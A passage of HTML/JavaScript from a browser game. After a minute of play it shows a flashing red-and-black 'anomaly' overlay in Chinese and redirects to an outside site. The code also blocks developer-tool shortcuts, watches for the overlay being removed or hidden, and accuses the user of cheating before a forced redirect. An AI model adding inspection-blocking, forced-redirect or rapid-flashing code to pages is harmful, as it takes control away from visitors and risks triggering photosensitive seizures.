          <div class="anomaly-warning">检测失败。</div>
          <div class="anomaly-text">这不是一个有效的号码。</div>
        `;

        const ov = document.getElementById('anomalyOverlay');
        let flashCount = 0;
        const flashInterval = setInterval(() => {
          flashCount++;
          if (flashCount % 2 === 1) {
            ov.style.background = '#ff0000';
          } else {
            ov.style.background = '#000';
          }
          if (flashCount >= 6) {
            clearInterval(flashInterval);
            ov.style.background = '#000';
          }
        }, 200);

        setTimeout(() => {
          window.location.href = 'https://mcjs.link';
        }, 2500);
      }, 2000);
    }

    // ===== 反开发者工具检测 =====
    let antiCheatTriggered = false;

    function triggerAntiCheat() {
      if (antiCheatTriggered) return;
      antiCheatTriggered = true;

      const content = document.getElementById('anomalyContent');
      content.innerHTML = `
        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
        <div class="anomaly-warning">你想干什么？作弊吗？</div>
      `;

      const ov = document.getElementById('anomalyOverlay');
      let flashCount = 0;
      const flashInterval = setInterval(() => {
        flashCount++;
        if (flashCount % 2 === 1) {
          ov.style.background = '#ff0000';
        } else {
          ov.style.background = '#000';
        }
        if (flashCount >= 10) {
          clearInterval(flashInterval);
          ov.style.background = '#000';
        }
      }, 150);

      setTimeout(() => {
        window.location.href = 'https://mcjs.link';
      }, 3000);
    }

    // 检测弹窗是否被删除（DOM 变化观察）
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.removedNodes) {
          if (node.id === 'anomalyOverlay' || (node.contains && node.contains(document.getElementById('anomalyOverlay')))) {
            triggerAntiCheat();
            observer.disconnect();
            return;
          }
        }
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // 检测弹窗样式被修改（如 display: none）
    const styleObserver = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.target.id === 'anomalyOverlay') {
          const style = window.getComputedStyle(mutation.target);
          if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {
            triggerAntiCheat();
            styleObserver.disconnect();
            return;
          }
        }
      }
    });
    styleObserver.observe(overlay, { attributes: true, attributeFilter: ['style', 'class'] });

    // 检测开发者工具快捷键
    window.addEventListener('keydown', (e) => {
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')
      ) {
        e.preventDefault();
        triggerAntiCheat();
      }
    });

    // 定期检测弹窗是否还存在
    const checkInterval = setInterval(() => {
      if (!document.getElementById('anomalyOverlay')) {
        triggerAntiCheat();
        clearInterval(checkInterval);
      }
    }, 500);
  }

  function gameLoop() {
    // 检查是否已运行一分钟
    if (!anomalyTriggered && Date.now() - gameStartTime >= 60000) {
      triggerAnomaly();
    }
    
    update();
    render();

    frameCount++;
    const now = performance.now();
    if (now - lastFpsTime >= 1000) {
      fps = frameCount;
      frameCount = 0;
      lastFpsTime = now;
      document.getElementById('fpsInfo').textContent = fps;
      document.getElementById('posInfo').textContent =
        Math.floor((player.x + player.w/2) / TILE) + ',' + Math.floor((player.y + player.h/2) / TILE);
    }

    requestAnimationFrame(gameLoop);
  }

  setTimeout(gameLoop, 100);
})();
</script>
</body>
</html>
